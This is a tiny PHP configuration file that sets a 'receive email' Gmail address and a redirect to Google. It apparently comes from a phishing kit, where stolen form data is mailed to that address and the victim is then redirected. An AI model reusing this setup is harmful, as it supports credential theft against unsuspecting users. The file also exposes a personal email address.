<?php 
$Receive_email="snow06672@gmail.com";
$redirect="https://www.google.com/";
?>